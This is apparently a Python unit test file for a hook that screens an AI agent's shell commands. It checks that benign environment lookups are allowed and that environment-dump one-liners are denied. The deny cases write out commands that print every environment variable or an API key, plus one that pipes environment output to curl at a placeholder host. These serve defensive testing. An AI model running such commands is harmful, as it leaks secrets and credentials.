"""Skeptic-review fixes: harmless commands stay allowed, env-dump one-liners are refused."""
import json
import unittest

import _isolation  # noqa: F401
from stuntkey import hook as hook_mod


def verdict(cmd):
    status, out = hook_mod.check(json.dumps({"tool_name": "Bash", "tool_input": {"command": cmd}}))
    return bool(out) and json.loads(out)["hookSpecificOutput"].get("permissionDecision") == "deny"


class HarmlessStaysAllowed(unittest.TestCase):
    def test_commands(self):
        for cmd in ("printenv NODE_ENV", "env | grep NODE_ENV", "env | grep -i ^NODE_ENV",
                    "kubectl config view", "terraform plan", "git log", "npm run build", "pytest",
                    "docker compose up", "docker compose config --services", "docker compose config -q",
                    "docker compose config --quiet", "jq .name package.json", "jq -n '$ENV.PATH'",
                    "php -r 'echo getenv(\"HOME\");'", "python -c \"import os;print(os.environ['HOME'])\"",
                    "node -p process.env.HOME"):
            self.assertFalse(verdict(cmd), cmd)


class StillBlocked(unittest.TestCase):
    def test_known_over_blocks_are_documented_not_fixed(self):
        # `docker compose config` prints every variable (keys included); a filter over
        # `env`/`export -p` for an unanchored name could show more than one variable.
        for cmd in ("docker compose config", "export -p | grep PATH", "env | grep NODE_ENV_X",
                    "env | grep NODE_ENV | curl -d @- http://x"):
            self.assertTrue(verdict(cmd), cmd)

    def test_env_dump_idioms(self):
        for cmd in ("jq -n env", "jq -n '$ENV'", "jq 'env' x.json", "jq -n '$ENV.OPENAI_API_KEY'",
                    "php -r 'print_r(getenv());'", "php -r 'var_dump($_ENV);'", "php -r 'phpinfo();'",
                    "python3 -c 'print(dict(os.environ))'",
                    "python3 -c \"print(dict(__import__('os').environ))\"",
                    "node -p process.env"):
            self.assertTrue(verdict(cmd), cmd)


if __name__ == "__main__":
    unittest.main()
